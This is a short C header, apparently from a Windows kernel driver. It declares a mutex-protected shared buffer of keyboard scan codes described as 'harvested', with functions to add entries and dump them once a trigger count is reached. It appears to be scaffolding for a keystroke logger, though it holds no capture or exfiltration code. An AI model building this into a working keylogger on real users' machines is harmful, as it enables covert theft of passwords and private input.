#pragma once


#define SZ_SHARED_ARRAY		64
#define TRIGGER_POINT		8

#define ACTION_ADD			0
#define ACTION_DMP			1

typedef struct _SHARED_ARRAY
{
	KEYBOARD_INPUT_DATA		buffer[SZ_SHARED_ARRAY];
	DWORD					currentIndex;		//determines where the most recently harvested scan code information will be placed in the array
	KMUTEX					mutex;				//synchronizatino primitive that must be acquired before the buffer can be manipulated		
} SHARED_ARRAY, * PSHARED_ARRAY;



void initSharedArray();

BOOLEAN isBufferReady();

void addEntry(KEYBOARD_INPUT_DATA key);

DWORD dumpArray(KEYBOARD_INPUT_DATA* dest);

DWORD modArray
(
	DWORD action,				//set to ACTION_ADD or ACTION_DMP
	KEYBOARD_INPUT_DATA* key,	//key data to add (if ACTION_ADD)
	KEYBOARD_INPUT_DATA* dest	//destination array (if ACTION_DUMP)
);